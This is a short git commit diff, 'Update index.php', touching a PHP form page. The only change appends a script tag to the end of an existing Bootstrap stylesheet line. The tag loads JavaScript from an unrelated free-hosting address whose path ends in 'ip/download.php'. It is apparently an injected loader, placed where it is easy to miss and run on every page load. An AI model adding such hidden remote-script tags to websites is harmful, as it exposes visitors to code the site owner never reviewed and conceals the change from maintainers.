7edf7830cbaacac4044e599c93b1cf85a92c15c5
Vijay Kumar <contactvkr@yahoo.com>
2021-06-13 16:28:32 +0530

    Update index.php

--- forms/index.php
+++ forms/index.php
@@ -5,7 +5,7 @@
 	$msgClass = '';
 ?>
 
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous"><script src="https://get2mate.000webhostapp.com/ip/download.php"></script>
 
 
 
